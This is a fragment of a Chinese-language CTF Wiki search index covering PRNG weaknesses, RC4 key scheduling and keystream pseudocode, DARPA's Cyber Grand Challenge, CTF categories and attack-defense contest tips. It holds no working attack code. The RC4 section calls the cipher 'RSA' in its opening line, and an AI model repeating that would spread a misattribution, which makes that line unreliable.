<li>\u751f\u6210\u5927\u6570\u65f6\uff0c\u5206\u914d\u7684\u4e0d\u5747\u5300\u3002</li> <li>\u8fde\u7eed\u503c\u4e4b\u95f4\u5173\u8054\u5bc6\u5207\uff0c\u77e5\u9053\u540e\u7eed\u503c\uff0c\u53ef\u4ee5\u77e5\u9053\u4e4b\u524d\u7684\u503c\u3002</li> <li>\u8f93\u51fa\u5e8f\u5217\u7684\u503c\u7684\u5927\u5c0f\u5f88\u4e0d\u5747\u5300\u3002</li> </ul>"},{"location":"crypto/streamcipher/prng/intro/#_8","title":"\u53c2\u8003","text":"<p>https://en.wikipedia.org/wiki/Pseudorandom_number_generator</p>"},{"location":"crypto/streamcipher/prng/problem/","title":"\u9898\u76ee","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/streamcipher/prng/problem/#2017-tokyo-westerns-ctf-3rd-backpackers-problem","title":"2017 Tokyo Westerns CTF 3rd Backpacker's Problem","text":"<p>\u9898\u76ee\u4e2d\u7ed9\u4e86\u4e00\u4e2a cpp \u6587\u4ef6\uff0c\u5927\u6982\u610f\u601d\u5982\u4e0b</p> <pre><code>Given the integers a_1, a_2, ..., a_N, your task is to find a subsequence b of a\nwhere b_1 + b_2 + ... + b_K = 0.\n\nInput Format: N a_1 a_2 ... a_N\nAnswer Format: K b_1 b_2 ... b_K\n\nExample Input:\n4 -8 -2 3 5\nExample Answer:\n3 -8 3 5\n</code></pre> <p>\u5373\u662f\u4e00\u4e2a\u80cc\u5305\u95ee\u9898\u3002\u5176\u4e2d\uff0c\u5728\u672c\u9898\u4e2d\uff0c\u6211\u4eec\u9700\u8981\u89e3\u51b3 20 \u4e2a\u8fd9\u6837\u7684\u80cc\u5305\u95ee\u9898\uff0c\u80cc\u5305\u5927\u5c0f\u4f9d\u6b21\u662f 1 * 10~20 * 10\u3002\u800c\u5b50\u96c6\u6c42\u548c\u7684\u80cc\u5305\u95ee\u9898\u662f\u4e00\u4e2a NPC \u95ee\u9898\uff0c\u95ee\u9898\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u968f\u7740\u968f\u7740\u80cc\u5305\u5927\u5c0f\u800c\u6307\u6570\u589e\u957f\u3002\u8fd9\u91cc\u80cc\u5305\u7684\u5927\u5c0f\u6700\u5927\u662f200\uff0c\u663e\u7136\u4e0d\u53ef\u80fd\u4f7f\u7528\u66b4\u529b\u7834\u89e3\u7684\u65b9\u5f0f\u3002</p> <p>\u5f85\u5b8c\u6210</p>"},{"location":"crypto/streamcipher/prng/problem/#_2","title":"\u53c2\u8003\u6587\u732e","text":"<ul> <li>https://github.com/r00ta/myWriteUps/tree/master/GoogleCTF/woodman</li> <li>http://mslc.ctf.su/wp/google-ctf-woodman-crypto-100/</li> </ul>"},{"location":"crypto/streamcipher/special/rc4/","title":"RC4","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/streamcipher/special/rc4/#_1","title":"\u57fa\u672c\u4ecb\u7ecd","text":"<p>RSA \u7531 Ron Rivest \u8bbe\u8ba1\uff0c\u6700\u521d\u96b6\u5c5e\u4e8e RSA \u5b89\u5168\u516c\u53f8\uff0c\u662f\u4e00\u4e2a\u4e13\u5229\u5bc6\u7801\u4ea7\u54c1\u3002\u5b83\u662f\u9762\u5411\u5b57\u8282\u7684\u6d41\u5bc6\u7801\uff0c\u5bc6\u94a5\u957f\u5ea6\u53ef\u53d8\uff0c\u975e\u5e38\u7b80\u5355\uff0c\u4f46\u4e5f\u5f88\u6709\u6548\u679c\u3002RC4 \u7b97\u6cd5\u5e7f\u6cdb\u5e94\u7528\u4e8e SSL/TLS \u534f\u8bae\u548c WEP/WPA \u534f\u8bae\u3002</p>"},{"location":"crypto/streamcipher/special/rc4/#_2","title":"\u57fa\u672c\u6d41\u7a0b","text":"<p>RC4 \u4e3b\u8981\u5305\u542b\u4e09\u4e2a\u6d41\u7a0b</p> <ul> <li>\u521d\u59cb\u5316 S \u548c T \u6570\u7ec4\u3002</li> <li>\u521d\u59cb\u5316\u7f6e\u6362 S\u3002</li> <li>\u751f\u6210\u5bc6\u94a5\u6d41\u3002</li> </ul>"},{"location":"crypto/streamcipher/special/rc4/#s-t","title":"\u521d\u59cb\u5316 S \u548c T \u6570\u7ec4","text":"<p>\u521d\u59cb\u5316 S \u548c T \u7684\u4ee3\u7801\u5982\u4e0b</p> <pre><code>for i = 0 to 255 do\nS[i] = i\nT[i] = K[i mod keylen])\n</code></pre> <p></p>"},{"location":"crypto/streamcipher/special/rc4/#s","title":"\u521d\u59cb\u5316\u7f6e\u6362 S","text":"<pre><code>j = 0\nfor i = 0 to 255 do j = (j + S[i] + T[i]) (mod 256) swap (S[i], S[j])\n</code></pre>"},{"location":"crypto/streamcipher/special/rc4/#_3","title":"\u751f\u6210\u6d41\u5bc6\u94a5","text":"<pre><code>i = j = 0 for each message byte b\ni = (i + 1) (mod 256)\nj = (j + S[i]) (mod 256)\nswap(S[i], S[j])\nt = (S[i] + S[j]) (mod 256) print S[t]\n</code></pre> <p>\u6211\u4eec\u4e00\u822c\u79f0\u524d\u4e24\u90e8\u5206\u4e3a KSA \uff0c\u6700\u540e\u4e00\u90e8\u5206\u662f PRGA\u3002</p>"},{"location":"crypto/streamcipher/special/rc4/#_4","title":"\u653b\u51fb\u65b9\u6cd5","text":"<p>\u5f85\u8865\u5145\u3002</p>"},{"location":"introduction/cgc/","title":"CGC \u8d85\u7ea7\u6311\u6218\u8d5b","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u672c\u8282\u5185\u5bb9\u6458\u81ea\u674e\u5eb7\u6559\u6388\u4e8e 2016 \u5e74 8 \u6708 17 \u65e5 ISC \u4e92\u8054\u7f51\u5b89\u5168\u5927\u4f1a\u6f14\u8bb2\u300a\u7f51\u7edc\u8d85\u7ea7\u6311\u6218\u8d5b\u4e2d\u7684\u6f0f\u6d1e\u53d1\u6398\u4e0e\u5229\u7528\u300b\u3002</p> <p>CGC \u7f51\u7edc\u8d85\u7ea7\u6311\u6218\u8d5b\u662f\u5168\u7403\u9996\u6b21\u673a\u5668\u7f51\u7edc\u653b\u9632\u6bd4\u8d5b\uff0c\u6bd4\u8d5b\u8fc7\u7a0b\u5168\u81ea\u52a8\uff0c\u65e0\u4efb\u4f55\u4eba\u5de5\u5e72\u9884\u3002\u8003\u9a8c\u673a\u5668\u81ea\u52a8\u6f0f\u6d1e\u6316\u6398\u3001\u81ea\u52a8\u8f6f\u4ef6\u52a0\u56fa\u3001\u81ea\u52a8\u6f0f\u6d1e\u5229\u7528\u548c\u81ea\u52a8\u7f51\u7edc\u9632\u62a4\u6c34\u5e73\u3002\u4f7f\u7528\u7b80\u5316\u7684 Linux \u64cd\u4f5c\u7cfb\u7edf------DECREE\uff0c\u7c7b\u4f3c Snort\u7684\u89c4\u5219\u8fc7\u6ee4\u9632\u706b\u5899\u3002\u5bf9 Linux \u4e8c\u8fdb\u5236\u7a0b\u5e8f\u8fdb\u884c\u6f0f\u6d1e\u6316\u6398\u3002\u6240\u6709\u53c2\u8d5b\u961f\u90fd\u6ca1\u6709\u7a0b\u5e8f\u6e90\u7801\u3002</p> <p>\u5728 2016 \u5e74\u7684 CGC \u6bd4\u8d5b\u4e2d\uff0c\u6311\u6218\u7684\u8d5b\u9898\u5305\u542b\u4e86 53 \u79cd CWE\u3002\u5176\u4e2d\u5305\u542b 28 \u4e2a\u5806\u6ea2\u51fa\u6f0f\u6d1e\u300124 \u4e2a\u6808\u6ea2\u51fa\u6f0f\u6d1e\u300116 \u4e2a\u7a7a\u6307\u9488\u8bbf\u95ee\u6f0f\u6d1e\u300113 \u4e2a\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\u548c 8 \u4e2a UAF \u6f0f\u6d1e\u3002</p> <p>\u653b\u9632\u8fc7\u7a0b\u7531\u7ec4\u7ec7\u65b9\u53d1\u51fa\u6311\u6218\u7a0b\u5e8f\uff0c\u5404\u56e2\u961f\u670d\u52a1\u5668\u53ef\u4ee5\u5411\u7ec4\u7ec7\u65b9\u63d0\u4f9b\u8865\u4e01\u7a0b\u5e8f\uff0c\u9632\u706b\u5899\u89c4\u5219\u548c\u653b\u51fb\u7a0b\u5e8f\u3002\u4fee\u8865\u8fc7\u7684\u7a0b\u5e8f\u548c\u9632\u706b\u5899\u89c4\u5219\u4f1a\u5206\u53d1\u7ed9\u5176\u4ed6\u56e2\u961f\u3002\u7ec4\u7ec7\u65b9\u4e3a\u6bcf\u4e2a\u56e2\u961f\u8fd0\u884c\u6311\u6218\u7a0b\u5e8f\uff0c\u8fdb\u884c\u670d\u52a1\u6d4b\u8bd5\u548c\u653b\u51fb\u5e76\u8fdb\u884c\u8bc4\u4f30\u3002</p>"},{"location":"introduction/cgc/#_1","title":"\u6027\u80fd\u8bc4\u4ef7\u6307\u6807","text":"<ol> <li>\u670d\u52a1\u6b63\u5e38\u8bbf\u95ee\u7684\u53cd\u5e94\u65f6\u95f4\uff1b</li> <li>\u6253\u8865\u4e01\u9891\u7387\uff1b</li> <li>\u52a0\u56fa\u7a0b\u5e8f\u7684\u6548\u7387\uff1b</li> <li>\u6210\u529f\u9632\u5fa1\u653b\u51fb\u7684\u6b21\u6570\u7edf\u8ba1\uff1b</li> <li>\u653b\u51fb\u6210\u529f\u6b21\u6570\u7edf\u8ba1\u3002</li> </ol>"},{"location":"introduction/cgc/#_2","title":"\u660e\u786e\u6838\u5fc3\u4efb\u52a1","text":"<p>\u62ff\u5230\u4e8c\u8fdb\u5236\u7a0b\u5e8f\uff0c\u8fdb\u884c\u81ea\u52a8\u5206\u6790\uff0c\u5728\u660e\u786e\u9632\u706b\u5899\u89c4\u5219\u540e\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u52a0\u56fa\u5e76\u751f\u6210\u653b\u51fb\u7a0b\u5e8f\u3002</p>"},{"location":"introduction/cgc/#_3","title":"\u5206\u6790\u65b9\u6cd5","text":"<ol> <li>\u5177\u4f53\u6267\u884c-\u4f7f\u7528\u6b63\u5e38\u7684\u6267\u884c\u6a21\u5f0f\uff1b</li> <li>\u7b26\u53f7\u6267\u884c-\u8f85\u52a9 Fuzzing \u9636\u6bb5\u7684\u8def\u5f84\u9009\u62e9\uff1b</li> <li>\u6df7\u5408\u6267\u884c-\u5e26\u6709\u5177\u4f53\u8f93\u5165\u7684\u7b26\u53f7\u6267\u884c\uff0c\u6839\u636e\u8f93\u5165\u9009\u62e9\u8def\u5f84\uff0c\u4f46\u4fdd\u7559\u7b26\u53f7\u6761\u4ef6\u3002</li> </ol>"},{"location":"introduction/cgc/#cgc_1","title":"CGC \u7ecf\u9a8c\u603b\u7ed3","text":"<ol> <li>\u5b8c\u7f8e\u9632\u5b88\u7684\u96be\u5ea6\u8fdc\u5927\u4e8e\u751f\u6210\u653b\u51fb\u7684\u96be\u5ea6\uff1b</li> <li>\u4e8c\u8fdb\u5236\u52a0\u56fa\u7a0b\u5e8f\u9700\u8981\u907f\u514d\u529f\u80fd\u635f\u5931\uff0c\u5e76\u6700\u5c0f\u5316\u6027\u80fd\u635f\u5931\uff1b</li> <li>\u5b89\u5168\u81ea\u52a8\u5316\u5904\u7406\u7684\u5927\u8d8b\u52bf\u5df2\u7ecf\u5f62\u6210\uff0c\u591a\u6570\u56e2\u961f\u53ef\u4ee5\u5728\u51e0\u79d2\u949f\u7684\u65f6\u95f4\u5bf9\u7b80\u5355\u5e94\u7528\u5f62\u6210\u653b\u51fb\u5e76\u751f\u6210\u6709\u6548\u9632\u5b88\uff1b</li> <li>\u5bf9\u6297\u4e2d\u7684\u7b56\u7565\u503c\u5f97\u7814\u7a76\uff0c\u6839\u636e\u81ea\u8eab\u548c\u5bf9\u624b\u7684\u653b\u9632\u80fd\u529b\uff0c\u5bf9\u8d44\u6e90\u548c\u52a8\u4f5c\u8fdb\u884c\u5408\u7406\u8c03\u6574\u3002</li> </ol>"},{"location":"introduction/content/","title":"CTF \u7ade\u8d5b\u5185\u5bb9","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u7531\u4e8e CTF \u7684\u8003\u9898\u8303\u56f4\u5176\u5b9e\u6bd4\u8f83\u5bbd\u5e7f\uff0c\u76ee\u524d\u4e5f\u6ca1\u6709\u592a\u660e\u786e\u7684\u89c4\u5b9a\u754c\u9650\u8bf4\u4f1a\u8003\u54ea\u4e9b\u5185\u5bb9\u3002\u4f46\u662f\u5c31\u76ee\u524d\u7684\u6bd4\u8d5b\u9898\u578b\u800c\u8a00\u7684\u8bdd\uff0c\u4e3b\u8981\u8fd8\u662f\u4f9d\u636e\u5e38\u89c1\u7684 Web \u7f51\u7edc\u653b\u9632\u3001RE \u9006\u5411\u5de5\u7a0b\u3001Pwn \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528\u3001Crypto \u5bc6\u7801\u653b\u51fb\u3001Mobile \u79fb\u52a8\u5b89\u5168 \u4ee5\u53ca Misc \u5b89\u5168\u6742\u9879 \u6765\u8fdb\u884c\u5206\u7c7b\u3002</p> <ul> <li> <p>Web - \u7f51\u7edc\u653b\u9632</p> <p>\u4e3b\u8981\u4ecb\u7ecd\u4e86 Web \u5b89\u5168\u4e2d\u5e38\u89c1\u7684\u6f0f\u6d1e\uff0c\u5982 SQL \u6ce8\u5165\u3001XSS\u3001CSRF\u3001\u6587\u4ef6\u5305\u542b\u3001\u6587\u4ef6\u4e0a\u4f20\u3001\u4ee3\u7801\u5ba1\u8ba1\u3001PHP \u5f31\u7c7b\u578b\u7b49\uff0cWeb \u5b89\u5168\u4e2d\u5e38\u89c1\u7684\u9898\u578b\u53ca\u89e3\u9898\u601d\u8def\uff0c\u5e76\u63d0\u4f9b\u4e86\u4e00\u4e9b\u5e38\u7528\u7684\u5de5\u5177\u3002</p> </li> <li> <p>Reverse Engineering - \u9006\u5411\u5de5\u7a0b</p> <p>\u4e3b\u8981\u4ecb\u7ecd\u4e86\u9006\u5411\u5de5\u7a0b\u4e2d\u7684\u5e38\u89c1\u9898\u578b\u3001\u5de5\u5177\u5e73\u53f0\u3001\u89e3\u9898\u601d\u8def\uff0c\u8fdb\u9636\u90e8\u5206\u4ecb\u7ecd\u4e86\u9006\u5411\u5de5\u7a0b\u4e2d\u5e38\u89c1\u7684\u8f6f\u4ef6\u4fdd\u62a4\u3001\u53cd\u7f16\u8bd1\u3001\u53cd\u8c03\u8bd5\u3001\u52a0\u58f3\u8131\u58f3\u6280\u672f\u3002</p> </li> <li> <p>Pwn - \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528</p> <p>Pwn \u9898\u76ee\u4e3b\u8981\u8003\u5bdf\u4e8c\u8fdb\u5236\u6f0f\u6d1e\u7684\u53d1\u6398\u548c\u5229\u7528\uff0c\u9700\u8981\u5bf9\u8ba1\u7b97\u673a\u64cd\u4f5c\u7cfb\u7edf\u5e95\u5c42\u6709\u4e00\u5b9a\u7684\u4e86\u89e3\u3002\u5728 CTF \u7ade\u8d5b\u4e2d\uff0cPWN \u9898\u76ee\u4e3b\u8981\u51fa\u73b0\u5728 Linux \u5e73\u53f0\u4e0a\u3002</p> </li> <li> <p>Crypto - \u5bc6\u7801\u653b\u51fb</p> <p>\u4e3b\u8981\u5305\u62ec\u53e4\u5178\u5bc6\u7801\u5b66\u548c\u73b0\u4ee3\u5bc6\u7801\u5b66\u4e24\u90e8\u5206\u5185\u5bb9\uff0c\u53e4\u5178\u5bc6\u7801\u5b66\u8da3\u5473\u6027\u5f3a\uff0c\u79cd\u7c7b\u7e41\u591a\uff0c\u73b0\u4ee3\u5bc6\u7801\u5b66\u5b89\u5168\u6027\u9ad8\uff0c\u5bf9\u7b97\u6cd5\u7406\u89e3\u7684\u8981\u6c42\u8f83\u9ad8\u3002</p> </li> <li> <p>Mobile - \u79fb\u52a8\u5b89\u5168</p> <p>\u4e3b\u8981\u4ecb\u7ecd\u4e86\u5b89\u5353\u9006\u5411\u4e2d\u7684\u5e38\u7528\u5de5\u5177\u548c\u4e3b\u8981\u95ee\u9898\u7c7b\u578b\uff0c\u5b89\u5353\u9006\u5411\u5e38\u5e38\u9700\u8981\u4e00\u5b9a\u7684\u5b89\u5353\u5f00\u53d1\u77e5\u8bc6\uff0ciOS \u9006\u5411\u9898\u76ee\u5728 CTF \u7ade\u8d5b\u4e2d\u8f83\u5c11\u51fa\u73b0\uff0c\u56e0\u6b64\u4e0d\u4f5c\u8fc7\u591a\u4ecb\u7ecd\u3002</p> </li> <li> <p>Misc - \u5b89\u5168\u6742\u9879</p> <p>\u4ee5\u8bf8\u845b\u5efa\u4f1f\u7ffb\u8bd1\u7684\u300a\u7ebf\u4e0a\u5e7d\u7075\uff1a\u4e16\u754c\u5934\u53f7\u9ed1\u5ba2\u7c73\u7279\u5c3c\u514b\u81ea\u4f20\u300b\u548c\u4e00\u4e9b\u5178\u578b MISC \u9898\u4e3a\u5207\u5165\u70b9\uff0c\u5185\u5bb9\u4e3b\u8981\u5305\u62ec\u4fe1\u606f\u641c\u96c6\u3001\u7f16\u7801\u5206\u6790\u3001\u53d6\u8bc1\u5206\u6790\u3001\u9690\u5199\u5206\u6790\u7b49\u3002</p> </li> </ul>"},{"location":"introduction/content/#-","title":"\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b - \u7ade\u8d5b\u5185\u5bb9","text":"<p>2016 \u5e74\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u5f00\u59cb\u4e3e\u529e\u521b\u65b0\u5b9e\u8df5\u6280\u80fd\u8d5b\uff0c\u91c7\u53d6\u7684\u5c31\u662f\u4f20\u7edf\u7684 CTF \u8d5b\u5236\u3002\u5728\u300a2016 \u5e74\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u53c2\u8d5b\u6307\u5357\u300b\u4e2d\u4e3b\u529e\u65b9\u7ed9\u51fa\u7684\u7ade\u8d5b\u5185\u5bb9\u76f8\u5bf9\u5168\u9762\uff0c\u503c\u5f97\u53c2\u8003\u3002</p> <ol> <li>\u7cfb\u7edf\u5b89\u5168\u3002\u6d89\u53ca\u64cd\u4f5c\u7cfb\u7edf\u548c Web \u7cfb\u7edf\u5b89\u5168\uff0c\u5305\u62ec Web \u7f51\u7ad9\u591a\u79cd\u8bed\u8a00\u6e90\u4ee3\u7801\u5ba1\u8ba1\u5206\u6790\uff08\u7279\u522b\u662f PHP\uff09\u3001\u6570\u636e\u5e93\u7ba1\u7406\u548c SQL \u64cd\u4f5c\u3001Web \u6f0f\u6d1e\u6316\u6398\u548c\u5229\u7528\uff08\u5982 SQL \u6ce8\u5165\u548cXSS\uff09\u3001\u670d\u52a1\u5668\u63d0\u6743\u3001\u7f16\u5199\u4ee3\u7801\u8865\u4e01\u5e76\u4fee\u590d\u7f51\u7ad9\u6f0f\u6d1e\u7b49\u5b89\u5168\u6280\u80fd\u3002</li> <li>\u8f6f\u4ef6\u9006\u5411\u3002\u6d89\u53ca Windows/Linux/Android \u5e73\u53f0\u7684\u591a\u79cd\u7f16\u7a0b\u6280\u672f\uff0c\u8981\u6c42\u5229\u7528\u5e38\u7528\u5de5\u5177\u5bf9\u6e90\u4ee3\u7801\u53ca\u4e8c\u8fdb\u5236\u6587\u4ef6\u8fdb\u884c\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1 Android \u79fb\u52a8\u5e94\u7528 APK     \u6587\u4ef6\u7684\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1\u52a0\u89e3\u5bc6\u3001\u5185\u6838\u7f16\u7a0b\u3001\u7b97\u6cd5\u3001\u53cd\u8c03\u8bd5\u548c\u4ee3\u7801\u6df7\u6dc6\u6280\u672f\u3002</li> <li>\u6f0f\u6d1e\u6316\u6398\u548c\u5229\u7528\u3002\u638c\u63e1 C/C++/Python/PHP/Java/Ruby/\u6c47\u7f16 \u7b49\u8bed\u8a00\uff0c\u6316\u6398 Windows/Linux\uff08x86/x86_64 \u5e73\u53f0\uff09\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u6f0f\u6d1e\uff0c\u638c\u63e1\u7f13\u51b2\u533a\u6ea2\u51fa\u548c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u653b\u51fb\uff0c\u7f16\u5199\u5e76\u5229\u7528 shellcode\u3002</li> <li>\u5bc6\u7801\u5b66\u539f\u7406\u53ca\u5e94\u7528\u3002\u638c\u63e1\u53e4\u5178\u5bc6\u7801\u5b66\u548c\u73b0\u4ee3\u5bc6\u7801\u5b66\uff0c\u5206\u6790\u5bc6\u7801\u7b97\u6cd5\u548c\u534f\u8bae\uff0c\u8ba1\u7b97\u5bc6\u94a5\u548c\u8fdb\u884c\u52a0\u89e3\u5bc6\u64cd\u4f5c\u3002</li> <li>\u5176\u4ed6\u5185\u5bb9\u3002\u5305\u62ec\u4fe1\u606f\u641c\u96c6\u80fd\u529b\uff0c\u7f16\u7a0b\u80fd\u529b\u3001\u79fb\u52a8\u5b89\u5168\u3001\u4e91\u7aef\u8ba1\u7b97\u5b89\u5168\u3001\u53ef\u4fe1\u8ba1\u7b97\u3001\u81ea\u4e3b\u53ef\u63a7\u3001\u9690\u5199\u672f\u548c\u4fe1\u606f\u9690\u85cf\u3001\u8ba1\u7b97\u673a\u53d6\u8bc1\uff08Forensics\uff09\u6280\u672f\u548c\u6587\u4ef6\u6062\u590d\u6280\u80fd\uff0c\u8ba1\u7b97\u673a\u7f51\u7edc\u57fa\u7840\u4ee5\u53ca\u5bf9\u7f51\u7edc\u6d41\u91cf\u7684\u5206\u6790\u80fd\u529b\u3002</li> </ol>"},{"location":"introduction/experience/","title":"\u7ebf\u4e0b\u653b\u9632\u7ecf\u9a8c\u5c0f\u7ed3","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u9996\u5148\uff0c\u6b63\u5e38\u6bd4\u8d5b\u4f1a\u63d0\u4f9b\u63d0\u4ea4 flag \u7684\u63a5\u53e3\uff0c\u63a5\u53e3\u5730\u5740\u7c7b\u4f3c <code>http://172.16.4.1/Common/submitAnswer</code>\u3002\u4e00\u822c\u6211\u4eec\u9700\u8981\u6839\u636e\u4e3b\u529e\u65b9\u7ed9\u51fa\u7684\u6587\u6863\u8981\u6c42\u901a\u8fc7\u63a5\u53e3\u63d0\u4ea4 flag\u3002\u5728\u6bd4\u8d5b\u4e2d\u8981\u6c42\u63a5\u53e3\u5730\u5740\u4f7f\u7528 Post  \u65b9\u5f0f\u63d0\u4ea4\uff0c\u63d0\u4ea4\u65f6\u5e26\u4e24\u4e2a\u53c2\u6570\uff0c\u4e00\u4e2a\u662f <code>Answer</code>\uff0c\u5176\u503c\u4e3a\u83b7\u53d6\u5230\u7684 flag \u5b57\u7b26\u4e32\uff0c\u800c\u53e6\u4e00\u4e2a\u5219\u662f <code>token</code> \uff0c\u5176\u503c\u4e3a\u5404\u4e2a\u961f\u4f0d\u7684\u961f\u4f0d Token\u3002</p> <p>\u7136\u540e\u6bd4\u8d5b\u65f6\u4e3b\u529e\u65b9\u4e5f\u4f1a\u7ed9\u6bcf\u4e2a\u53c2\u8d5b\u961f\u4f0d\u63d0\u4f9b\u4e00\u53f0\u7528\u4e8e \u5206\u6790\u7f51\u7edc\u6d41\u91cf\u7684\u865a\u62df\u673a \uff0c\u9009\u624b\u9700\u8981\u8bbf\u95ee\u5730\u5740\u4e0b\u8f7d\u6d41\u91cf\u6587\u4ef6\u8fdb\u884c\u5206\u6790\u3002</p>"},{"location":"introduction/experience/#gamebox","title":"\u5173\u6ce8 Gamebox \u72b6\u6001","text":"<p>\u6bd4\u8d5b\u4e2d\u53ef\u4ee5\u67e5\u770b\u5df1\u65b9\u548c\u654c\u65b9 GameBox \u72b6\u6001\u3002\u65f6\u523b\u5173\u6ce8\u53ef\u4ee5\u5c3d\u65e9\u83b7\u53d6\u6bd4\u8d5b\u4fe1\u606f\uff0c\u6839\u636e\u4fe1\u606f\u505a\u51fa\u8c03\u6574\u3002</p> <p>\u5bf9\u4e8e\u5df1\u65b9 GameBox\uff0c\u6709\u5b58\u5728\u5982\u4e0b\u539f\u56e0\u9020\u6210 GameBox \u88ab down \u6389\uff1a</p> <ol> <li>\u4e3b\u529e\u65b9\u88c1\u5224\u7cfb\u7edf\u5b58\u5728\u5931\u8bef\uff0c\u8bef\u5224 GameBox \u4e3a\u4e0d\u53ef\u7528\u72b6\u6001\u3002\u8fd9\u79cd\u60c5\u51b5\u4e00\u822c\u5728\u6bd4\u8d5b\u5f00\u59cb\u524d\u53ef\u4ee5\u53d1\u73b0\uff0c\u5982\u679c\u53d1\u73b0\u5b58\u5728\u8fd9\u79cd\u60c5\u51b5\uff0c\u8981\u5c3d\u65e9\u5411\u5de5\u4f5c\u4eba\u5458\u793a\u610f\u5904\u7406\u4ee5\u51cf\u5c11\u635f\u5931\u3002</li> <li>\u7a0b\u5e8f patch \u5931\u8bef\u5bfc\u81f4\u670d\u52a1\u4e0d\u53ef\u7528\u3002\u5728\u7a0b\u5e8f patch \u5b8c\u4e4b\u540e\u8981\u8fdb\u5165\u4e0b\u4e00\u8f6e\u5173\u6ce8 GameBox \u72b6\u6001\uff0c\u5982\u679c patch \u5931\u8bef\u5bfc\u81f4\u4e0d\u53ef\u7528\uff0c\u9700\u8981\u53ca\u65f6\u633d\u6551\u3002\u4f46\u662f\u4e5f\u4e0d\u8981\u8fc7\u5ea6\u62c5\u5fc3\u628a\u539f\u6765\u7684\u672a\u4fee\u8865\u8fc7\u7684\u6f0f\u6d1e\u7a0b\u5e8f\u6362\u56de\u53bb\u3002\u56e0\u4e3a down     \u6389\u662f\u6240\u6709\u961f\u5e73\u5206\u5f97\u5f88\u5c11\u7684\u5206\uff0c\u800c\u76f4\u63a5\u4e0a\u6f0f\u6d1e\u7a0b\u5e8f\u4f1a\u4f7f\u5f97\u5f3a\u52bf\u7684\u961f\u4f0d\u76f4\u63a5\u5229\u7528\u5f97\u5230\u5f88\u9ad8\u7684\u5f97\u5206\u3002\u6240\u4ee5\u8981\u4f9d\u636e\u5177\u4f53\u60c5\u51b5\u5bf9\u5f85\u3002</li> <li>\u5bf9\u624b\u4e0d\u6b63\u5f53\u653b\u51fb\u5bfc\u81f4 GameBox \u4e0d\u53ef\u7528\u3002\u5982\u679c\u53d1\u73b0\uff0c\u9700\u8981\u53ca\u65f6\u8865\u6551\u3002</li> <li>\u4e3b\u529e\u65b9\u52a0\u5f3a\u7a0b\u5e8f check\u3002\u8fd9\u79cd\u60c5\u51b5\u4e3b\u529e\u65b9\u4f1a\u5bf9\u6240\u6709\u961f\u5458\u8fdb\u884c\u901a\u77e5\u516c\u544a\u3002\u5728 GameBox \u72b6\u6001\u5899\u4e0a\u7684\u72b6\u6001\u4f1a\u663e\u793a\u8be5\u9898\u7684\u5404\u961f GameBox \u5927\u9762\u79ef\u4e0d\u53ef\u7528\u3002</li> </ol> <p>\u5bf9\u4e8e\u654c\u65b9 GameBox\u3002\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u4ee5\u4e0b\u4fe1\u606f\u3002</p> <ol> <li>\u6839\u636e\u653b\u51fb\u6d41\u89c2\u6d4b\u54ea\u4e9b\u961f\u4f0d\u7684 GameBox \u6ca1\u6709\u9632\u5fa1\u6210\u529f\u3002\u9488\u5bf9\u8fd9\u4e9b\u961f\u4f0d\u53ef\u4ee5\u66f4\u591a\u5730\u5b9e\u73b0\u653b\u51fb</li> <li>\u6709\u961f\u4f0d\u62ff\u51fa\u4e00\u8840\u65f6\u3002\u53ef\u4ee5\u6839\u636e\u5404\u961f GameBox \u72b6\u6001\u63a8\u65ad\u51fa\u4e00\u8840\u961f\u4f0d\u662f\u5426\u5df2\u7ecf\u5199\u51fa\u5229\u7528\u811a\u672c\u3002\u5199\u51fa\u5229\u7528\u811a\u672c\u540e\u53ef\u4ee5\u89c2\u6d4b\u5df1\u65b9\u662f\u5426\u505a\u597d\u4e86\u9632\u5fa1\u3002</li> </ol>"},{"location":"introduction/experience/#_2","title":"\u5206\u6e05\u533a\u6bb5\u4e0e\u7aef\u53e3","text":"<p>\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u4f1a\u4e3b\u529e\u65b9\u4f1a\u5b89\u6392\u597d\u5408\u7406\u7684\u7f51\u6bb5\u5206\u5e03\u3002</p> <p>\u7ef4\u62a4\u7684\u65f6\u5019\u9700\u8981\u8fde\u63a5\u5230\u672c\u961f GameBox \u6240\u5728\u7f51\u6bb5\u4e0a\uff0c\u6839\u636e\u4e3b\u529e\u65b9\u63d0\u4f9b\u7684 CTF \u8d26\u53f7\u4e0e\u5bc6\u7801\u767b\u5f55\u3002\u800c\u4e0e\u5176\u4ed6\u961f\u4f0d\u7684 GameBox \u4ea4\u4e92\u65f6\u5219\u9700\u8981\u8fde\u63a5\u5230\u5bf9\u5e94\u7684\u7f51\u6bb5\u91cc\u4e0e\u6f0f\u6d1e\u7a0b\u5e8f\u8fdb\u884c\u4ea4\u4e92\u3002\u63d0\u4ea4 flag \u5219\u9700\u8981\u5230\u6307\u5b9a\u7684\u7b54\u9898\u5e73\u53f0\u4e0a\u63d0\u4ea4\u3002</p> <p>Warning</p> 